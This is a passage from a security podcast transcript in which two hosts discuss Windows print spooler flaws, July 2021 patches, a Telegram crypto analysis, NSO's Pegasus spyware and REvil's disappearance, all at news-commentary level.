The workaround turned out to be, if you had enabled a feature which first appeared in Windows 2000, PointAndPrint, then you still had a problem.  And when everyone said, aha, Microsoft, you didn't fix it, Microsoft amended their bulletin to tell us that, if you had these two keys in your registry enabling PointAndPrint, your system was, and I quoted this, they literally said "vulnerable by design." 



LEO:  We meant to do that.



STEVE:  Yes.  And of course we paused the podcast to note that we'd been looking for a slogan for Windows 11.  And now we had it.



LEO:  Vulnerable by design.



STEVE:  Windows 11:  Vulnerable by Design.  So believe it or not, that wasn't the end of it.  So for the first of the two problems we're going to talk about today, Microsoft has assigned the first one CVE-2021-34481.  And it's been given a CVSS severity score of 7.8.  Microsoft writes:  "An elevation of privilege vulnerability exists when the Windows Printer Spooler service improperly performs privileged file operations."  Very generic.  They've got some monkey, I think, that types these; right?  Or just selects one from column A and one from column B because they're so generic.



But they continue:  "An attacker who successfully exploited this vulnerability could run arbitrary code with system privileges.  An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.  An attacker must have the ability to execute code on a victim system to exploit this vulnerability.  The workaround for this vulnerability is stopping and disabling the Print Spooler service."



And we also talked last week about how it was the case that you and I, Leo, apparently because we're old-school, believed, as I did until I tried it, that you could stop the print spooler, and everything would be fine.



LEO:  Yeah.  I got a lot of messaging about that, yeah.



STEVE:  Oh, boy, yes.  We weren't through with the podcast before Twitter blew up.



LEO:  It was complicated.  It's not - it's complicated.



STEVE:  Right, right.  Okay.  So in other words, with this latest escalation of privilege vulnerability, we are back to disabling Windows print spooler service because some way has been found to use it to bypass Windows security privilege system to obtain full system privilege.  As Microsoft's note says, this is a pure elevation of privilege.  An attacker must have already obtained the ability to execute code on a target system.  It can only be exploited locally to gain elevation of privileges on a device.  On the other hand, as we know, it's often easy to get onto a device as the unprivileged user, and what you want to do is elevate your privilege to root so that you can then really do dastardly things, like if you're on a domain controller.  So it's like, yeah, that's what you want.



In their bulletin's FAQ, they ask and answer the first two questions:  Is this vulnerability related to the previously addressed CVE-2021-1675 and CVE-2021-34527 vulnerabilities.  And the response from Microsoft, this distinct vulnerability also exists in the print spooler service.  However, the security impact is local elevation of privilege.  So in other words, yeah, this is another one.  Okay.  And then the second question, did the July 2021 security update, that is to say last Tuesday's patch update, introduce this vulnerability, since where did it come from?  And Microsoft confesses:  "No, the vulnerability existed before the July 13, 2021 security update.  We recommend that Microsoft customers install the latest security updates."  Because, after all, we would like to whittle the count down, as they did by 117.  But anyway, we'll get to that in a minute.



Okay.  So there's one.  That's the first one.  Okay.  So that was the first problem, another new distinct from the first two privilege escalation flaw in printer server.  There's no indication whether it's being attacked in the wild.  Maybe we're going to wait a month for August's Patch Tuesday.  Maybe somebody will figure out that - or that they see it's being used in the wild by some malefactors, then we're going to get an update.  Who knows?  But at this point it is publicly known that there is such a problem.



And since print spooler is running on all machines by default, you know, as we've been saying now for two weeks, if you can stop your spooler service, if there's machines you've got around that do not need to have the print spooler running, like probably your domain controller, I don't know, maybe you've got printers attached to it, and it's a server also.  But where you can, stop print server.  Disable it.  If you don't need it, that's always just good advice.  Don't have excess code running because every blob of code that's running is another opportunity for exposure.



Okay.  So that's the first one.  This one is interesting because this is another by-design problem, and I don't think it can get fixed.



LEO:  Ooh, that's not good.



STEVE:  No.  Okay.  So this falls under it's not a bug, it's a feature, because it's a consequence of Microsoft's deliberate system-level design.  The latest technique for abusing what is beginning to look like some serious fundamentally poorly designed systems within Windows printing is brought to us by Benjamin Delpy.  Ben is the creator of Mimikatz, which we've talked about from time to time just in passing.  He originally created Mimikatz as a proof-of-concept demonstration to Microsoft that their authentication protocols were vulnerable to attack.  In doing so, he also created what has become one of the most widely used and downloaded hacker tools of the past 20 years.  Jake Williams, president and founder of Rendition Infosec, has been quoted saying that Mimikatz has done more to advance security than any other tool he can think of.  So Benjamin has some Windows hacking cred.



In his tweet last Wednesday, after this month's patches had landed, and Microsoft had explained to the world that when Windows PointAndPrint was enabled, Windows was vulnerable by design, Ben tweeted with the hashtag #printnightmare - Episode 3."  And there is a four, and the four was the other problem.  He said, under Episode 3, he said:  "You know that even patched, with default config or security enforced with Microsoft settings, a standard user can load drivers as system.  Local Privilege Escalation, #feature."  Meaning this is what Microsoft intended. 



Ben found a way - and actually he just highlighted some interaction of the systems that Microsoft has designed - which abuses Windows' normal method of installing printer drivers to gain local system privileges through malicious printer drivers.  The technique can be used even if administrators have applied Microsoft's recommended mitigations of restricting printer driver installation to admins and disabling PointAndPrint, which is what they're now recommending.  Though Ben's new local privilege escalation hack is not the same as the ones that we refer to as PrintNightmare, he feels that similar and related printer driver installation bugs ought to be grouped under the same name.  He's explained that even with all mitigations applied, an attacker could create a signed malicious printer driver package and use it to achieve system privileges on other systems.



Okay.  So how's this done?  The attacker first creates a malicious code, a malicious printer driver, and signs it using any valid Authenticode certificate.  That's not hard to do since anyone is able to obtain a code signing cert.  So the bar there is very low.  Once the attacker has a signed printer driver package, they're able to install the driver on any network device on which they've obtained admin privileges.  This is also not actually a high bar since it can be comparatively easy to obtain admin on low-value systems.



The point is that, once this is done, due to the way Microsoft has designed the security governing printer driver installation, attackers can use this low-value system as a pivot to obtain system privileges on other high-value devices where they do not have elevated privileges, simply by causing those systems to install the now-trusted and installed locally, yet malicious printer driver.



If this sounds like a way for malicious actors to move laterally through an already compromised network, you're exactly right.  And that's the example that Benjamin described.  To prevent this style of attack, the printer spooler can be disabled or, bizarrely enough, PointAndPrint could be enabled with a policy to limit the servers from which a device can download printer drivers, thus preventing it from accepting your malicious, you know, the attacker's malicious printer driver which has been installed.  But if PointAndPrint is enabled, then the mitigations created by Microsoft's most recent emergency patch can be bypassed through the vulnerability-by-design problem.



So we've got a Catch-22.  And when Ben was asked how Microsoft could prevent this type of attack, he explained that they had attempted to prevent it in the past by deprecating version 3 printer drivers.  But that caused so many problems that Microsoft backed off and terminated the version 3 deprecation policy four years ago, in June of 2017.  In other words, they tried to tighten things down.  But as we talked about before, you can't retroactively require signing of things that are already out on the Internet and installed in systems, and so you can't retroactively require signing where you didn't before.



Windows is designed to allow an administrator to install a printer driver, benign or malicious.  And Windows is designed to allow non-admin users to install signed drivers onto their devices automagically.  These two design choices interact to allow a signed malicious printer driver to be propagated across and throughout an enterprise's network.  So if you're thinking that this whole Windows printer driver security design is a true mess, you're thinking correctly.  Designed as it is, it cannot be secured.



Microsoft cannot and will not remove features which have been designed into Windows to allow it to work the way they want it to, the way their users have grown to expect it to and now depend upon it to.  And so this is the case, even though Microsoft clearly knows fully well that those features open Windows to exploitation.  Or, as Microsoft themselves phrased it in the bulletin for their most recent patch - actually now it's next to most recent - it is "vulnerable by design."



LEO:  Well, that explains everything.  In other words, we can't fix it because it would break it for other people.



STEVE:  Can't be fixed.



LEO:  Can't be fixed.  It's part of the way it works.



STEVE:  Yes, functionality that is the way they want it.  It's like, well, yes.  If somebody signed a malicious driver, and they were briefly somehow in admin on a low-value system, then they could install that malicious driver, and all other users could be induced to load that driver into their own systems.  Whoops.



Yeah.  Okay.  Patch Tuesday's review.  Last Tuesday was what started out as Microsoft's monthly patch day, that is, every Patch Tuesday, second Tuesday of the month.  But it's gradually morphed into the industry's patch event.  Aside from Microsoft, last Tuesday saw patches delivered from Adobe; Google with their Android product; Apache Tomcat; Cisco; Citrix; Juniper Networks; the SUSE, Oracle, and Red Hat Linux distributions; SAP; Schneider Electric; Siemens; and VMware.  So yeah, I don't know if the other companies are looking for cover.  So it's like, oh, yeah, maybe nobody will notice if Microsoft pumps out 117 security patches.  Anyway, whatever.



Due to Microsoft's scope of influence, no one tops the importance of Microsoft's patches. nor their breathtaking number and severity.  This past Tuesday they fixed, as I've said, a total of 117 security vulnerabilities, among which were 13 rated critical and nine, yes, nine, zero-day flaws, four of which are known to be currently employed by active attacks in the wild, potentially enabling an adversary to take control of affected systems.  These 117 updates span Microsoft products including Windows, Bing, Dynamics, Exchange Server - they're still working on that one, have been all year; right? - Office, Windows Scripting Engine, Windows DNS, and Visual Studio Code.



And if you're thinking that 117 seems like a large number, you'd be right.  We only had 50 the month before, in June, and 55 the month before that in May.  So this is more than a double-whammy month for Microsoft.  The four flaws known to be under active - they're zero-day flaws under active exploitation.  There is one in Windows Print Spooler, which is allowing remote code execution.  There are two Windows kernel elevation, which are allowing privilege elevations.  And there's a scripting engine memory corruption vulnerability.



Microsoft noted that the last one, the scripting engine memory corruption vulnerability, had a very high attack complexity, explaining that attacks using it require luring an unsuspecting user to a malicious attacker-hosted website which contains a specially crafted file.



LEO:  Why, it's virtually impossible.



STEVE:  How can that ever happen?



LEO:  It could never happen.



STEVE:  Leo, who's going to do that?  Yeah.  But of course that's the way websites work.  So doesn't seem like such a high bar.  So I think maybe in the future, when we read that, oh, it's got some complexity to it, maybe we should now take that with a grain of salt.  And since this is the one, it's one of the four that is under active exploitation, it sure does appear that this complexity, such as it is, hasn't created an insurmountable impediment for the attackers.  Microsoft is apparently still working to clean up, as I noted, their Exchange Server product more than seven months after its problems first began to appear, with all the problems that we covered in the beginning of the year.



So two of the five publicly disclosed, but not currently exploited, as far as we know, that would be Microsoft Exchange Server remote code execution, so there's one that they fixed last week.  And there's another elevation of privilege in Exchange Server.  Both of those have been fixed last week.  And finally, the last three, an Active Directory security bypass, Windows ADFS security bypass, and Windows certificate spoofing.  Whoops.  You don't want your certificates to be spoofed, so good thing that got fixed.



They also closed a security bypass vulnerability in Windows Hello biometrics-based authentication that permitted an adversary to spoof a target's face and get around the login screen.  We don't know how.  Maybe stick your tongue out, it just lets you in.  They fixed a remote code execution vulnerability affecting Windows DNS Server that had a CVSS of 8.8, and one in the Windows kernel having a rare CVSS of 9.9.  Wow.  Whatever that was, I'm glad it's dead now.



So we had a sizable Microsoft Patch Tuesday that would have been much larger and bigger news normally, if it weren't, you know, if we weren't all still reeling from the recent PrintNightmares and just the shocks from the huge Kaseya REvil attacks.  Oh, and I did want to remind everybody to update Acrobat and Reader if you're using Acrobat or Reader to read PDFs.  Adobe also had a very big Patch Tuesday of their own.  They resolved vulnerabilities in Dimension, Illustrator, FrameMaker, and as I said, Acrobat and Reader and their free Bridge media management product.  I won't go into the details.



I will note that Acrobat and Reader had 14 critical and five important vulnerabilities fixed.  Since most of those critical vulnerabilities can be leveraged into remote code execution, and since today's attackers, contemporary attackers, are quickly comparing previous versions of fixed software to the released fixes to rapidly create exploits in order to exploit these systems before they're patched, it's important.  And we also know that opening a PDF in email is a highly popular means for getting into people's systems, you know, sending phishing emails with a PDF.  The way they leverage it is hoping that you're going to use a not-yet-updated version of Reader to view it.  So definitely worth doing.



Okay.  Under "Rolling Your Own Crypto," our longtime listeners will recall, because this has been a ways now, how skeptical I've always been of Telegram.  The reason is that, right off the bat, I looked carefully at their cryptography.  And the only term that comes to mind to accurately describe it would be the word "mess."  Telegram's crypto is a godforsaken mess.  I've never used it, and I never would.  The fact that Telegram's crypto designers offered a large reward for anyone who could find a flaw in their homegrown mess says nothing about the quality of that mess.  It only further demonstrates their misplaced confidence in the way they believe they've reversibly scrambled their users' plaintext.



My favorite example of the fundamental misunderstanding of security was literally onstage in the well-meaning form of Microsoft's Steve Ballmer, when he was prancing around during the launch of Windows XP, declaring it to be the most secure Windows ever.  The trouble is, since something is secure only until it's not, and since it's not possible to prove a negative, it's not possible to make any factual statement about a product's security out of the gate.  Something's security can only be demonstrated and proven over time.  If something stands the test of time, and many attempts at its attack, only then can we begin to trust and believe in its security.  Something's history is what matters, and a well-matured history is what we have with today's standard and standardized cryptographic security protocols.  We know they are as safe as they've been proven to be.



And this is exactly why homegrown cryptography is, by definition, the dumbest thing anyone can do.  Sure, if they had no alternative, if there were no other choice, if secure solutions didn't exist, then yeah, roll your own.  Hold your breath and hope for the best because no other choice is available.  But when Telegram was being designed, the world already had time-tested hacker- and academically-proven secure cryptographic protocol solutions.  This was a solved problem, as much as it could be.  We already had publicly and freely available ways to build proven bulletproof communication systems.  This is why Telegram, when they rolled their own, and I looked at it closely, it just didn't make any sense to me.  And now those chickens, as they say, have come home to roost.



An international team of computer scientists, cryptographers from ETH Zurich in Switzerland and the Royal Holloway College at the University of London, were released from their disclosure embargo last Friday to reveal that they had uncovered four cryptographic vulnerabilities in Telegram which could affect Telegram's half a billion users.  That's right, 500 million users of Telegram.  Hey, you know, Telegram looks great.  What could possibly be wrong with it?  Their full report will be presented at the prestigious 43rd IEEE Symposium on Security and Privacy next May.  But I've included a link to their 52-page highly detailed paper in the show notes for anyone who wants more than I'm going to take the time to share today.  They also offer a far more user-friendly page on GitHub that turns their many pages of dense math into English.



They start off summarizing their work by saying this.  They wrote:  "We performed a detailed security analysis of the encryption offered by the popular Telegram messaging platform.  As a result of our analysis, we found several cryptographic weaknesses in the protocol, from technically trivial and easy to exploit, to more advanced and of theoretical interest.



"For most users, the immediate risk is low; but these vulnerabilities highlight that Telegram fell short of the cryptographic guarantees enjoyed by other widely deployed cryptographic protocols such as TLS.  We made several suggestions to the Telegram developers that enable providing formal assurances that rule out a large class of cryptographic attacks, similarly to other more established cryptographic protocols.



"Telegram uses its bespoke MTProto protocol to secure communications between clients and its servers as a replacement for the industry-standard Transport Layer Security (TLS) protocol.  While Telegram is often referred to as an 'encrypted messenger,' this level of protection is the only protection offered by default.  MTProto-based end-to-end encryption, which would protect communication from Telegram employees or anyone breaking into Telegram's servers, is only optional, and not available for group chats.  We thus focused our efforts on analyzing whether Telegram's MTProto offers comparable privacy to surfing the web with HTTPS."  In other words, they were comparing apples to apples.



So then they go on to explain that:  "We disclosed the following vulnerabilities to the Telegram development team on April 16th, 2021, and agreed with them on a disclosure date of July 16th, 2021."  In other words, last Friday.  They then proceed to detail the four primary problems their analysis uncovered.  And they are - it is deep math.  But they said:  "For example, one of the vulnerabilities is the so-called - they called it the "Crime Pizza" vulnerability.



LEO:  Oh, yeah.



STEVE:  Yeah.  You'll get this in a second.  It allows for the arbitrary reordering of individual Telegram messages without detection.  In their example, if the order of the messages in the sequence "I say 'yes' to 'pizza,'" "I say 'no' to 'crime'" were to be reordered, it would appear that the client is saying no to pizza and yes to their willingness to commit a crime.  That may seem like a trivial problem; but if you think about it for a minute, there are likely ways that it could be exploited and abused.



But more to the point, it's never been possible to do that with our established protocols.  It's one of the guarantees we take for granted that's provided by the other protocols we use today.  And I'm sure that the fact that this should be prevented simply never occurred to the doubtless well-meaning developers of Telegram's protocol.  And that is exactly the point, that it didn't occur to them.  No developer can possibly take on the level of responsibility that's required for doing everything exactly right because there are so very many things that can go wrong.



By all means, roll your own crypto as a hobby.  It's fun to scramble and then descramble some bits.  Use it to chat among your friends.  But don't put it into the hands of 500 million innocent users under the promise that it's unbreakable.  It's not a promise that's practical to keep.



When master chefs are preparing food for others, they choose only the finest ingredients.  When I was developing SQRL I similarly chose only the best-known and well-proven security primitives.  And even so, I often stated that my various sphincters were tightly closed and that I hoped that I had not made any mistakes.  Hope was all I had there, backed by the extreme care and testing that SQRL received.  But at least I knew that I had used only the best ingredients.  So Telegram did get its long-awaited analysis, and they learned something from the academicians who took the time to unscramble that wacky kitchen sink protocol that they had.  And turns out, wow, yeah, looks like it scrambles stuff really well.  But did you consider that it doesn't care what order things are in?  Oh.



LEO:  Whoops.



STEVE:  Whoops.  Again, nothing against these guys.  I mean, it is too hard to do this, like to consider every possible thing that can happen.  So don't.  Use one of the established systems that's already solved this problem.



LEO:  Yeah, we never could understand why they wanted to roll their own.



STEVE:  No.



LEO:  It just didn't make sense.



STEVE:  No, never did.  Did not make sense.  I think, you know, I've been accused, fairly, of having a strong case of NIH, you know, not invented here.  Theirs was apparently even stronger.



LEO:  Yeah.



STEVE:  Okay.  So, Pegasus.  The Israeli NSO Group produces and sells cyber surveillance spyware known as Pegasus.  And Leo, this story has a fabulous moral you're going to love.  After being surreptitiously installed onto targeted iPhones and Android devices, Pegasus enables its victim, or I guess, well, its client that has arranged to install it and is using it to capture emails, SMS messages, media, calendars, phone calls, contact information, and messaging chat content from messaging apps like WhatsApp, Telegram and Signal.  And as if that wasn't enough, it's also able to stealthily activate the phone's microphone and camera.  Because of course.



LEO:  Why not?  Why not?



STEVE:  Who knows what you're going to overhear?  Just as a separate issue, Pegasus provides a classic example of the fact that it doesn't matter how good one's crypto is, I mean, because Signal was among those; right?



LEO:  Right.



STEVE:  And we know Moxie Marlinspike nailed the crypto with Signal.  It doesn't matter how good the crypto is if it's possible to simply capture the plaintext at either end of the encrypted tunnel.  And note that even users of Apple's iPhone, with its much-heralded privacy protections and encrypted enclaves, fell victim to this pre-encryption and post-decryption shim.  Okay.  But back to Pegasus.



A data leak of more than 50,000 phone numbers catalyzed a collaborative investigation by more than 80 journalists from a consortium of 17 media organizations in 10 different countries.  The investigation was coordinated by "Forbidden Stories," which is a Paris-based media nonprofit, and technical assistance was made available by Amnesty International.  This investigation uncovered that Pegasus was being used, not only for the surveillance of high-value targeted possible terrorists and other high-value criminals; but, sadly, and hardly surprising, heads of state, activists, journalists, lawyers, and businessmen  around the world.



In response to the discovery of the extent to which Pegasus spyware was being abused, Amnesty International's Secretary-General was quoted, saying:  "The Pegasus Project lays bare how NSO's spyware is a weapon of choice for repressive governments seeking to silence journalists, attack activists, and crush dissent, placing countless lives in peril.  These revelations blow apart any claims by NSO that such attacks are rare and due to rogue use of their technology.  While the company claims its spyware is only used for legitimate criminal and terror investigations, it's clear its technology facilitates systemic abuse.  They paint a picture of legitimacy while profiting from widespread human rights violations."



Okay.  So Pegasus is sold by the NSO Group to governments worldwide.  It worms its way into its unwitting target's devices, either exploiting currently unknown security vulnerabilities in common apps, or by getting a potential target to click on a malicious link.  The NSO Group describes itself as "the world leader in precision cyber intelligence solutions for the sole use of vetted-and-approved state-administered intelligence and law enforcement agencies solely for use in criminal and anti-terrorist investigations."



Okay, wait.  Hold on a minute.  That's exactly the group of entities and exactly their stated purpose behind their often-expressed need for having a responsible use backdoor added to the world's current mathematically secure encryption.  Okay.  Like we're going to trust this group of bureaucratic ne'er-do-wells with the key to anyone's backdoor?  Okay.  The list of infected phone numbers, which did not include their owners' names, so a lot of reverse lookup was being done, contains hundreds of business executives, religious figures, academics, NSO employees, union officials, and government officials operating in at least 11 countries, including Azerbaijan, Bahrain, Hungary, India, Kazakhstan, Mexico, Morocco, Rwanda, Saudi Arabia, Togo, and the UAE.



The timeline of the intrusions is spread over a seven-year period, from 2014 up to as recently as today; and the research has so far managed to identify 180 journalists and more than 600 politicians and government officials, despite their respective countries' adamant denials of having used Pegasus to hack the phones of the individuals named in the list.



Not surprisingly, the NSO Group flatly and loudly dispute all of the evidence and allegations.  They state that the investigation is "full of wrong assumptions and uncorroborated theories that raise serious doubts about the reliability and interests of the sources," while they stress that they are on a "life-saving mission to break up pedophilia rings" - that's right, march out the kids - "sex and drug-trafficking rings, locate missing and kidnapped children, locate survivors trapped under collapsed buildings" - what?



LEO:  What?



STEVE:  I know, "...and protect airspace against disruptive penetration by dangerous drones."  Okay.  Now,  I read that through a couple times, and the only sense I can make of it is that some other of the NSO Group's products might be used for things like locating survivors trapped under collapsed buildings and ridding the airspace of illegal drone flyovers.  I suspect that they may have been attempting to point to some of the good things their technologies can and have been used for.  It's like we're not going to notice Pegasus.



And speaking of technologies and the Pegasus product, a forensic analysis of 67 mobile devices showed the intrusions involved the ongoing use of multiple zero-click exploits which do not rely upon any interaction from the device's user.  And those both worked seven years ago, and they still work now.  In one instance which was highlighted by Amnesty International, multiple zero-days were leveraged in iMessage to successfully penetrate a fully patched iPhone 12 running iOS 14.6 this month.  So maybe they won't work today because it's 14.7.  But come on.  If 14.6 had multiple zero-days in iMessage, you've got to know that 14.7 has some, and they'll just ratchet forward their exploit chain.



In a series of tweets, Citizen Lab's Bill Marczak said:  "All this indicates that NSO Group can break into the latest iPhones.  It also indicates that Apple has a MAJOR" - all caps, his emphasis - "blinking red five-alarm fire problem with iMessage security that their so-called BlastDoor Framework, which was introduced in iOS 14" - which also apparently introduced the %@ remote code execution vulnerability, so BlastDoor blasted the doors off that.  Anyway, "BlastDoor, which is supposed to make zero-click exploitation more difficult," Bill said, "is not successfully preventing those problems."



The Washington Post said in their in-depth report that, of the tested smartphones, 23 devices had been successfully infected with Pegasus, and 15 exhibited signs of attempted penetration.  So, you know, we've seen other similar, smaller anecdotal examples of this sort of abuse.  I really hope that this expos might help to strongly demonstrate why we as an industry must always be working as hard as we can to create the most absolutely secure devices and protocols possible, and that any deliberate weakening below the best we can possibly do would be foolhardy in the extreme.  We just can't let the government say, oh, trust us, we're the government.



For anyone wanting more details, the Amnesty International report is amazing, and even further damning.  It contains IP addresses, port numbers, the URLs of servers, the names of background Pegasus processes, and more.  The link is in the show notes.



And Leo, we're going to take our last break.  Then I'm going to entertain everybody with the bit of errata from last week and the vanishing act that REvil has performed.



LEO:  Good.



STEVE:  So first, last week we drilled down into the Windows APIs that supported Windows on-the-fly PointAndPrint driver features.  And in explaining the oddity of API function naming, there were several APIs ending in Ex.  And I explained that this was a common occurrence for Microsoft, that the Ex is short for "extended" and is their way of amending an earlier non-extended, non-Ex API call, almost always by adding some additional parameters that time or advancing capabilities has shown were needed.  And I made the offhand remark that there were no ExExes, that is, extended extensions.  Well, I should have known better.  



LEO:  Of course there are.



STEVE:  Of course there are.



LEO:  Of course there had to be.



STEVE:  I was quickly called out on that in GRC's Security Now! newsgroup by someone who did know better.  Turns out that there's an original LogonUser API with that name, and of course an extended LogonUserEx API, and an even further extended LogonUserExEx API.



LEO:  Of course there is.



STEVE:  And Microsoft, if at first you don't succeed, yeah, just force us all to upgrade.  Anyway, a tip of the hat to Greg Bell for paying attention and helping me to keep my facts straight.



Okay.  July has been REvil month for this podcast.  We kicked off the month on the 6th with The Kaseya Saga.  And then because the crypto underlying REvil's Sodinokibi malware appeared to be uniquely powerful and well designed, we took it completely apart last week with our podcast REvil's Clever Crypto.  So it's fitting, I think, that we wrap up this third-in-a-row podcast focused upon REvil's own apparent wrap-up, which occurred suddenly and without apparent warning or notice, not that there would have been any way for them to give us any, early last week.  But I guess they could have put up a sign saying goodbye.  They didn't do that.  As we were laying out the details last week of REvil's cryptographic architecture, the REvil gang was packing their virtual bags.



The first anyone outside of the REvil organization knew of this was when at, interestingly, 8:00 a.m. Moscow time, all of REvil's online infrastructure disappeared at once.  Attempts to access their onion-routed Tor site returned the message "Onionsite Not Found," with the detailed error code 0xF0, so hex F0, which is "The requested onion service descriptor can't be found on the hashring, and therefore the service is not reachable by the client."



Being the Internet, sites sometimes come and go as infrastructure is changed and updated.  We see that from time to time.  I try to keep GRC's forums, the web forums and the server up.  But you've got to do your updates every so often.  So, yeah.  You can get little glitches.  And of course onion sites are no exception.  The Tor Project's Al Smith, who manages communications and fundraising for Tor, told BleepingComputer's Lawrence Abrams, you know, BleepingComputer's founder, that receiving this error generally means that the onion site is offline or disabled, but that to know for sure what it means you'd need to contact the onion site's administrator.



But it wasn't just the Tor site that disappeared at 8:00 a.m. Moscow time.  All of REvil's infrastructure shut down and went offline simultaneously.  REvil's regular public Internet-facing side, now, that's the non-Tor, and I saw the term being used "clearsite," which I thought was cool, that's like plaintext, cleartext, clearsite.  That's "decoder.re."  It also disappeared at the same time.  And the official MalwareHunterTeam Twitter account later tweeted the next day:  "REvil's clearweb payment site decoder.re was already down eight to nine hours ago" - and he was tweeting eight or nine hours later - "with not only the server down, or no A record, no DNS response at all."



And in reply, Jaime Blasco, who's with AT&T's Alien Labs Cybersecurity group tweeted:  "No DNS records, but previous A record server" - he had kept a record of it, and that was 82.146.34.4 - "is still up."  And then he said:  "(Only SSH open)."  And then he said:  "And likely actor controller name server ns1.goprodns.top also up, only SSH."  Okay, so the point there is this means that no one tripped over a cord somewhere, right, and like caused a power failure and no one noticed it.  If you go up a few levels, the servers that were previously supplying the data are themselves still online.  But the services that they were previously offering have been terminated.



Now, recall that XSS was that Russian language-speaking hacking forum that had previously changed its policies, deciding to stop hosting malware forums and discussion after that mess that DarkSide made with its high-publicity attack on - oh, actually it's one of DarkSide's affiliates attacked Colonial Pipeline and brought down the whole Eastern seaboard of the U.S. energy oil petroleum infrastructure.  Okay.  Well, later last Tuesday a representative from the LockBit ransomware gang posted to that XSS forum that it was rumored the REvil gang erased their servers after learning of a government subpoena.



BleepingComputer obtained an English translation of the Russian posting which read:  "Upon uncorroborated information, REvil server infrastructure received a government legal request forcing REvil to completely erase server infrastructure and disappear.  However, it is not confirmed."  And then, shortly after that, the XSS forum's administrator banned REvil's public-facing representative, who was known under the name "Unknown" from the forum.  Attempting to look up that forum member shows "banned" in the forum software.



I've been watching, as I imagine many of us have, the saber-rattling that U.S. President Biden has been doing relative to these apparently Russia-based, and at least tacitly allowed, ransomware cyberattacks against the West.  We do know that it's true that, due to Biden's lifelong participation in U.S. national politics, and his eight-year stint as Obama's VP, that he actually does have a working relationship with Russia's President Vladimir Putin.  So it may well be that Biden's reported soft ultimatums, which have been getting a little less soft recently, that if Russia doesn't do something about this internally, the U.S. would take some actions ourselves, or themselves, has been effective.



In full display in front of the press, following the signing of an executive order at the White House recently, Biden said:  "I made it very clear to him" - meaning Putin - "that the United States expects when a ransomware operation is coming from his soil, even though it's not sponsored by the state, we expect them to act if we give them enough information to act on who that is."  



So although we don't have definitive proof that REvil is gone, we're now "disappearance plus one week," and REvil has not returned.  So this was clearly deliberate.  An NSLOOKUP of their public-facing decoder.re still returns an NXDOMAIN error  no DNS resolution for a domain of that name.  While we'll likely never know what triggered REvil's sudden departure from the ransomware scene, more to the point is what happens next.



We've seen ransomware groups like Babuk and DarkSide shut themselves down, more or less voluntarily, due to increased scrutiny and pressure from law enforcement.  DarkSide really, as we know, stepped in it when one of their affiliates took down Colonial Pipeline's operation.  And we're now seeing more "socially responsible," if you can believe that, choosing of attack victims, for exactly that reason.  Attacking infrastructure of any kind  energy, healthcare, or education  tends to rouse the bear.



So what we're seeing is that fame for a ransomware group is a double-edged sword.  Under today's evolving ransomware affiliation model, a group needs sufficient reputation to be able to attract the best and most capable affiliates.  But at the same time, to any degree possible, they also want to remain as far under the radar of their hosting country's law enforcement as possible; and, by extension, under the radar of the world.



After the Babuk ransomware gang shut down and disbanded over disagreements about how their attacks were being conducted, a contingent of that group later relaunched under Babuk v2.0.  And remember that REvil themselves is already in its second incarnation.  Many of its group members were part of the earlier GandCrab ransomware group which was shut down, only to later be reborn as REvil.



Just as the Colonial Pipeline attack was too much and forced the shutdown of DarkSide, the massive ransomware disasters that were enabled first by the attack and shutdown of that meatpacker JBS Foods, and then by the Kaseya server breaches, made REvil a household name overnight.  And that's not what any ransomware operation wants to be.  They want and need to operate in the shadows, hidden by Tor and by Bitcoin and by a layer of intermediate affiliations.



Given the maturity of the GandCrab/REvil malware platform, Sodinokibi, and the amount of money that can be extorted through the ransomware model, I won't be surprised if this group doesn't take away a few lessons from the DarkSide's Colonial Pipeline, JBS Foods, and Kaseya overachievements to somehow arrange to throttle future attacks so that they can remain diffuse and effective, while also remaining well beneath any one government's radar.  I expect they're not gone for good.



LEO:  Yeah.  I think this is a rebranding, how about.



STEVE:  Yup.  Yup.



LEO:  It's too much money to leave on the table.



STEVE:  It is.



LEO:  But obviously they're scared of the whole thing, and they don't want to go to Russian jail.  So they're going to play it low and show up somewhere else, I think.



STEVE:  A site that we should tell you about, Leo, because I told everybody last week, it's a week old, or not long old, called Ransomwhere.  You might want to bring it up.  It's .re.  So Ransomwhe.re, Ransomwhere.  Actually it's a new employee of the firm that we talked about formed by Alex Stamos and the other - oh, and Chris Krebs, not Brian Krebs, Chris Krebs.



LEO:  Yeah, yeah, yeah, Chris Krebs, yeah, yeah.



STEVE:  Anyway, one of their new employees put up this site.  And what's interesting is that it shows their - oh, in fact it was at 60 million last week.  Now it's at 92.



LEO:  So none this week.  Last month - this is tracked ransomware payments.  And I presume they're just tracking bitcoin accounts and that kind of thing.  But all time is $92.5 million.



STEVE:  I believe it was at 60 last week.  So what they're doing, if you scroll down, they have basically a database of payments.  Oh, okay.  Now the bar is completely different.  That first one was NetWalker.



LEO:  Now it's Conti, yeah.



STEVE:  Conti's number one?



LEO:  And the REvil Sodinokibi.



STEVE:  Ah, okay.  I think they had...



LEO:  So maybe they're getting more data, probably.



STEVE:  Yes.  Yeah.  They had a ransomware in the first place that was very suspicious to me.  So I'll bet it was a bad record that they fixed.



LEO:  That's probably it, yeah.  This is all generated...



STEVE:  It makes much more sense that Conti would be in number one and REvil in number two.



LEO:  Yeah, yeah, yeah.



STEVE:  Anyway, so anyway, basically it is a ransomware tracking site, tracking payments and bitcoin addresses.  And people are able to submit events that they're aware of in the hopes that that this will create a public clearinghouse of ransomware events.  So anyway, the thing that brought that site to mind is the scope of the dollars, Leo.  As you were saying, it just, unfortunately, it makes too much money.



LEO:  Right, right.  It's just too much money.  It's funny because Lisa and I were watching a movie, a relatively recent movie about armored car robberies.  And I realized you don't hear a lot about that anymore because, what, you're going to risk your life for a couple of million when you can completely anonymously make 20, 30 million just like that with ransomware?  All the smart crooks, anyway, are going cyber.  Why carry a gun?  You know, that's dangerous.



STEVE:  We've just started to watch a series called "StartUp."



LEO:  Oh, it's good; isn't it?



STEVE:  Yeah.



LEO:  Yeah, we just finished it, yeah.



STEVE:  And we just started.  It's 7.9 on IMDB, so that clears the bar for me.  And yeah, we just started.  We're two episodes in.  And it made me think of that because we're talking about crooks and cryptocurrency.



LEO:  Yeah.  You'll laugh at some of the tech boners.  But you'll be very interested, I think, in what happens at the end of Season 2.



STEVE:  Oh, cool.



LEO:  That's all I'm going to say.



STEVE:  Ah.



LEO:  But it rings a bell.



STEVE:  Nice.



